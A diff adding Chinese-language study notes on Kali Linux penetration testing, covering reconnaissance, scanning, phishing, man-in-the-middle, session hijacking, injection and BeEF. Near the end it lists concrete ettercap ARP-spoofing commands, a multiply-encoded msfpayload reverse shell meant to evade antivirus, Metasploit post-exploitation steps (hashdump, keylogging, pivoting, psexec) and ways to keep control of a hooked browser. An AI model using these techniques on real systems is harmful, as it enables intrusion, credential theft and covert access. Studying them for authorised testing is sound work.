@@ -1,0 +1,190 @@
+#关于kali学习中的笔记
+侦察：
+收集目标信息，以便开展下一步行动
+
+web历史归档网站（wayback machine）：在网站早期版本中，肯能找到有用信息
+区域互联完注册管理机构（RIR）
+电子化数据收集、分析及检索
+社交媒体资源：qq、微信、facebook，寻找目标以及其员工信息：kali linux的Maltego，可将社交媒体、公开记录等合在一起定位某人
+信任关系：伪装身份，在网络上虚拟一个人物
+招聘广告：可以通过于招聘人员沟通，旁敲侧击，询问一些有用信息
+
+Shodan搜索引擎：搜索公开互联网访问的特定设备，如运行着某个版本软件的Cisco
+Google Hacking：一种特殊的搜索语法，利用google搜索的高级操作定位有用信息（google hacking 数据库 GHDB）比如，可以连接一个开放的摄像头
+HTTrack：克隆网站工具，可以克隆网站所有文件和网页，以便研究网站漏洞
+ICMP侦察技术：ping（fping）检测目标是否处于活跃状态；traceroute定位数据流动路径
+DNS侦察技术：勾勒出系统和子域的框图，工具Dig用来查询DNS服务器；在子域寻找目标时，尝试使用Fierce窥测DNS服务器是否允许区域传送，如果不允许，Fierce可以配置暴力法枚举主机名，尽可能得到主机记录信息，确定目标ip
+  搜索解析域名的授权dns服务器：dig -t ns 域名
+Maltego：收集互联网公开信息，擅长收集目标指纹
+Nmap：网络映射器，扫描局域网主机和服务；甚至检测系统上运行的应用及服务，还可提取OS指纹，但很容易惊动目标；我们使用在DNS侦察中收集的信息来定位主机，可以探测主机开放端口，运行的应用，以及web服务器ip、操作系统
+Foca：网站元数据侦察工具，元数据即关于数据的数据，如登录系统的用户名
+
+漏洞评估：
+
+Webshang：对web服务器安全审计的工具，比如端口扫描、url扫描、文件模糊测试，报告以多种形式输出
+Skipfish：利用递归爬虫和基于字典的探针生成交互式网站地图
+ProxyStrike：应用代理，默认监听端口8008，在浏览目标网站时，后台分析参数；爬虫功能用来扫描目标网站SQL或SSL以及XSS插件漏洞
+Vega：安全测试工具，爬取网站，分析页面内容找到链接和表单参数，列出发现的漏洞及可能造成影响
+Owasp-Zap：拦截代理，创建SSL证书，导入浏览器，设置代理端口，拦截SSL传送的HTTPS数据；爬取目标网站以找出和目标网站关联的链接，然后进行漏洞扫描
+Websploit：扫描和分析远程系统，以找到漏洞的开源项目
+
+漏洞利用：
+
+Metasploit：服务器端攻击框架（先启动Postgres SQL和Metaploit服务），可以调用nmap扫描，结果以XML文件添加到Metasploit中；可选择Samba共享的漏洞，RHOST参数写上目标ip，设置攻击载荷（执行漏洞利用的代码）；幸运的话，可以拿下目标所有权限
+  注：尚有不明处
+w3af：web应用扫描器和漏洞利用工具，输入url，自动寻找漏洞，插件可以利用漏洞获得目标的shell
+电子邮件系统漏洞：利用侦察技术，搜集托管服务起信息（如使用Fierce找出特定域名的MX主机）；使用Netcat连接邮箱服务器，连接成功后用helo命令告诉服务器我们的身份。如果收到回应，可使用SMTP命令对大多数服务器进行操作
+  注：尚有不名处
+
+暴力破解攻击：
+Hydra：锁定协议，暴力破解；开始前，可使用侦察技术收集信息（目标ip、开放端口、协议、用户名）；与其搭配的时火狐插件Tamper Data，它允许攻击者查看HTTP、HTTPS的GET和POST信息（收集Hydra需要的web信息时，推荐使用Netcat和Tamper Data）
+  注：SMTP攻击尚有不明
+DirBuster:暴力破解web服务器目录和文件名，只要HTTP响应不是404，就可以进行暴力破解
+WebSlayer：暴力破解表单、GET和POST参数，也可找出没有被链接的资源，如脚本、文件、目录等；生成攻击载荷，安装火狐插件Live HTTP Headers，抓取数据包；登陆时，将需要攻击部分填写FUZZ，调用字典暴力破解
+  注：需要仔细研究，用处颇大
+
+破解密码：
+John the Ripper：破解不同类型密码，能够自动检测多数散列和加密密码，且可定制性强
+
+中间人攻击：
+SSL strip：设置重定向，使目标数据流向kali linux，设置转发功能，实现中间人攻击
+
+客户端攻击：
+社会工程工具集（set）：
+  鱼叉式网络钓鱼：克隆网站，设置外网或内网攻击，输入反向连接ip（kali linux），输入希望克隆的url；SET会使用Metasploit框架发送漏洞利用，如windows reverse_tcp meterpreter/，让受害者运行可执行程序，建立开放端口，获得其全部权限
+  凭据收集器攻击：可以选择克隆网站、使用模板或是导入web文件，发送假冒邮件，当用户在钓鱼网站上输入用户密码时，kali将截获
+MITM代理服务器：检查HTTPS的连接，暂停、检查和回复请求，甚至允许替换web服务器的请求或响应（建议在搭建SET攻击和分析攻击行为时使用MITM）
+
+主机扫描：
+Nessus：扫描目标主机漏洞，可以使用Metasploit等工具进行利用
+
+获取和破解用户密码：
+windows：使用U盘挂在其c盘下SAM和SYSTEM文件，利用工具对散列进行破解
+linux：获取passwd和shadow文件，shadow只有root可读，难度大，需通过引导加载程序，如grub
+密码破解工具：种类繁多，可慢慢研究（johnny,hashcat,oclhashcat）
+samdump2：可用来转存windows的SAM文件，以便离线破解
+chntpw:U盘运行，可重置windows本地密码
+Ophcrack：彩虹表密码破解工具，U盘运行取证模式，获取c盘SAM数据库
+字典生成：自带Crunch，但速度较慢，推荐网上下载字典生成软件
+
+会话攻击：
+点击劫持：在页面上覆盖一个透明的页面，通过设计按钮组件位置，放上诱人的信息，达到攻击目的
+火狐插件：
+  cookie injector：允许用户从wireshark等工具抓取的cookie中，直接复制粘帖，篡改浏览器的cookie
+  web developer：提供编辑注入cookie的功能
+  cookies manager+：查看、编辑和创建cookie，会显示详细信息，并支持批量编辑；也可用于备份和还原cookie
+  cookie cadger：截获详细HTTP请求，并回放非安全HTTP GET请求；还提供对有线、无线网络的实时分析，以及加载数据包捕捉文件（pcap）
+
+抓包工具：
+  wireshark：同时安装greasemonkey和cookie injector来复制粘帖到浏览器中
+  hamster：通过HTTP会话劫持窃取cookie的工具，使用被动嗅探；它会窃听网络上的数据，抓取可见cookie；hamster使用ferret来抓取cookie
+
+中间人攻击：
+主动窃听，如伪装成无线路由器，其实为中间人；绕过HTTPS进行攻击，可使用SSLstrip
+  dnsniff：密码嗅探和网络数据分析工具，用于解析不同应用协议和提取相关信息
+  arpspoof：向本地网络发送伪造的地址解析协议，将kali的mac地址和目标ip关联起来，从而使发往目标的数据都发送到kali；
+  一个人工中间人攻击方法：将两者结合用在系统间，告诉目标你是另一个系统或网关，告诉网关你是目标；使用此功能，你需要开启ip转发；成功实现后，启用dsniff观察网络数据
+
+ettercap：自动实现中间人攻击，扫描局域网主机，勾选设置选项，即可完成（效果同上）
+driftnet：从活动的网络数据中抓取图片，要求先建立一个中间人攻击
+
+SQL注入：
+火狐插件hackbar：支持测试SQL查询，并将你的查询注入，改变SQL请求；尝试登录一个网站，然后打开hackbar菜单，构造SQL注入语句，可能拿下网站管理权限
+sqlmap：自动化检测和利用SQL注入漏洞的过程，以及接管数据库服务器；自带一个检测引擎，以及大量渗透测试功能；支持SQL注入技术、枚举用户、密码散列（url带php，则确定其调用了SQL脚本）；正确使用，取得web服务器数据库所有表
+
+跨站脚本（XSS）：
+跨站脚本允许攻击者向网站注入脚本，这些脚本可用于修改web服务器，或是影响用户；一个简单的检测方法，是使用简单的搜索字符串
+谷歌创建了gruyere项目，用以测试web应用漏洞
+
+注：SQL、XSS需着重学习
+
+web攻击：
+BeEF：浏览器漏洞利用框架，它会通过用户访问定制的url，以勾住用户浏览器；其绕过了网络安全部署以及反病毒程序；可通过诱使目标点击，或是重定向其请求（如中间人下可重定向，或是点击劫持等）
+  勾住用户浏览器后，可以在目标机器上执行命令；抓取会话cookie，截屏，记录按键信息，用其做代理攻击其余主机
+foxyproxy：火狐插件，自由切换代理
+brup：爬虫以自动化方式将web应用的请求关系映射出来，列出没有直接访问的链接，爬取截获的页面；此外还能截获根目录、web页面样式、子目录、java代码
+owasp（前面有概述）：可选择被动扫描或主动扫描
+SET密码收集：克隆主流网站，实现钓鱼
+fimap：自动查找、准备、审计、利用和用骨骼搜索web应用中的本地和远程文件包含Bug；指定url确定目标，它将试图找出所有文件包含的漏洞
+
+拒绝服务攻击：
+THC-SSL-DOS
+Scapy
+slowloris：可用于dos攻击的低带宽HTTP客户端，其特点时攻击时不采用常用的洪水技术，发送部分HTTP请求来保持连接；每隔一段时间就发送数百个后续分片的头，逐步耗尽服务器资源
+低轨道离子加农炮（LOIC）：网络压力测试工具
+
+dnschef：dns代理，也被称作伪造dns，通过提供伪造dns可实现流量重定向
+sniffjoke：对tcp连接进行透明处理，并可进行延迟、修改、注入伪造数据；这技术可以有效防御如IDS/IPS或嗅探工具的拦截
+siege：HTTP/HTTPS测压工具，多种工作模式
+inundator：一款绕过入侵检测系统（IDS）和入侵防御系统（IPS）的工具，对系统的日志文件发动洪水攻击；先进行假阳性洪水攻击，以隐藏真实攻击
+tcpreplay：会用抓取的libpcap数据，进行归类，确定是客户端还是服务端的，并重放或传输到其他设备；简单来说，其可以抓取客户端和服务器之间的数据流，然后在网络任何位置回放
+
+实战问题汇总：
+beef和metasploit关联失败时，可能是刚修改配置没有重启服务，可选择重启，另外kali 2.0已经取消了metasploit服务
+启动带数据库支持的msf方式如下：终端下，启动postgresql数据库：/etc/init.d/postgresql start,或service postgresql start；初始化msf数据库Lmsfdb init；运行msfconsole：msfconsole；在msf中查看数据库链接状态：db_status
+尝试ssl连接，或是beef start
+
+dns欺骗、arp欺骗：ettercap
+ettercap：终端常用命令
+# ettercap -Tzq 
+以命令行方式显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息。
+
+# ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/
+嗅探网关192.168.1.1与部分主机192.168.1.2-10之间相互通信的数据包。
+
+# ettercap -Tzq //110
+只嗅探本机110端口pop3的信息。
+
+# ettercap -Tzq /192.168.0.11/21,22,23
+只嗅探本机与192.168.0.11主机在端口21、22、23上的通信。
+
+# ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /192.168.0.11/80 //
+在eth0网卡上用自己的filter嗅探ip为192.168.0.11主机在80端口上的所有通信，并把所有的数据包保存成文件名为“sniffed_data”的文件。
+
+# ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /10.1.1.1/ /10.1.1.2/
+单向欺骗路由，只劫持路由发向10.1.1.2的数据包。
+
+DNS欺骗是一种非常危险的攻击，因为攻击者可以利用ettercap的dns_spoof插件和其他工具执行攻击。最终，攻击者可以使用一个社会工程工具包（作者这里指的应该是SET了）来执行攻击去控制受害者的电脑。想象一下这是多少容易，通过社会工程工具包和DNS欺骗技术你所需要做得就是配置你的社会工程工具包和你的IP清单，制作像谷歌一样的网站欺骗域名到你的IP地址上。当受害者打开google，你的攻击将使它访问你的IP，之后建立一个远程的会话。
+让我们来考虑一个示例场景：metasploit渗透工具使用ettercap进行dns欺骗
+要使受害者访问特定url，可考虑点击劫持、dns欺骗
+
+metasploit攻击基本过程：
+1. 选择exploit，即选择漏洞执行攻击(use exploit/windows/smb/ms08_067_netapi)使用命令 search samba type:exploit platform:unix 可找到漏洞信息
+2. 选择payload，攻击成功后执行操作，回连kali
+3. 设置参数 (set RHOST,set LPORT …)与目标相关信息
+4. 执行攻击
+
+msfpayload 这个工具主要的功能就是将Metasploit 中的payloads(工具载荷）包装成一个可执行的文件，或者包装成指定的类型
+msfencode 输出数据的方式和msfpayload一样，如果没有指定输出方式则默认输出到屏幕
+原始数据可以使用msfpayload 最后指定一个R 参数来获取
+后门程序免杀，将程序经过msfencode多重编码附加
+
+root@bt:/opt/metasploit/msf3# ./msfpayload windows/shell/reverse_tcp LHOST=192.168.0.112 R | ./msfencode -e x86/shikata_ga_nai -c 5 -t raw | ./msfencode -e x86/alpha_upper -c 2 -t raw | ./msfencode -e x86/shikata_ga_nai -c 5 -t raw | ./msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
+这么多次的编码，仍然会被小红伞检测出来，修改里面的编码次数和编码方式，变幻一下应该免杀效果会好一些
+kali 2.0使用msfvenom，集成二者
+lhost为kali rhost为目标
+
+拿下meterpreter shell后，可执行stdapi command，stdapi中有关于文件读写，上传下载，目录切换，截屏，摄像头，键盘记录，和系统相关的命令
+meterpreter shell 下执行run hashdump，可以捕获目标的hash值，这些hash值解出来为敏感信息，为后续渗透作铺垫
+执行ps来看当前运行的应用程序以及运行他们的用户，寻找域管理员使用痕迹，使用incognito模块通过list_tokens列举所有可用令牌
+执行keyscan嗅探管理员键盘输入，可通过keyscan_dump来查看结果
+设置跳板，将以渗透的主机当作踏板，run get local subnets
+meterpreter > background 后台运行
+使用db_nmap，或使用msf自带的端口扫面，扫描内网开放端口
+使用auxiliary/scanner/smb/smb_version（use 漏洞）对域内主机系统版本做个扫描，对应使用漏洞
+使用破解的hash以及登录名对域内主机进行远程桌面登录测试，Use auxiliary/scanner/smb/smb_login
+使用UPLOAD UPLOAD 登录一台机器，试一下目标机器能否访问外网。使用auxiliary/admin/smb/psexec_command来执行特定命令来看一下能否访问外网
+下面使用use windows/smb/psexec（远程登录）来登录目标机器并且执行payload返回一个shell
+可观察各主机解密的hash值，可能发现规律
+
+beef实战：
+方法1：目标访问http://192.168.198.128:3000/demos/basic.html
+
+    msf > use auxiliary/server/browser_autopwn   
+    msf  auxiliary(browser_autopwn) > set LHOST 192.168.198.128 #我服务器自己的地址  
+    LHOST => 192.168.198.128  
+    msf  auxiliary(browser_autopwn) > run  
+生成hook链接，选择url，控制被hook的浏览器去访问这个链接
+hooked domain/redirect browser 填写url，成功拿到shll
+方法2：直接在beef后台攻击模块，配置监听端口等信息，成功后在metasploit中输入session -i就会显示出会话
+HOOK持续的时间为关闭测试页面为止，为了控制的时间更长一些，可以发送一个命令让右下角悄悄的弹一个小窗；即使对方关闭网页，小窗还在，还是可以控制
